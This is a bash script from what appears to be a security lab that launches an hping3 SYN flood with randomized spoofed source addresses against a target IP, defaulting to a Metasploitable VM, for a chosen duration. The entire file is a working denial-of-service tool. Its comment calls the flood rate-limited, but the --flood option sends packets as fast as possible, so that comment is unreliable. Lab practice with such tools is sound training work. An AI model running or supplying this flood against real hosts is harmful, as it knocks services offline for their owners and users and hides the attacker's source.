#!/bin/bash
# vm_lab/attack_scripts/dos_attack.sh
# Simulates a DoS flood (hping3 SYN flood) for lab purposes.
# Run from Kali Linux → target Metasploitable (VM only!)
# Usage: ./dos_attack.sh <TARGET_IP> <DURATION_SECONDS>

TARGET=${1:-"192.168.232.128"}
DURATION=${2:-10}
PORT=80

echo "[*] Simulating DoS SYN flood on $TARGET:$PORT for ${DURATION}s"
echo "[!] FOR LAB USE ONLY — isolated VM network"

# hping3 SYN flood (rate-limited for simulation)
timeout $DURATION hping3 --syn --flood --rand-source -p $PORT $TARGET &>/dev/null

echo "[*] DoS simulation complete."
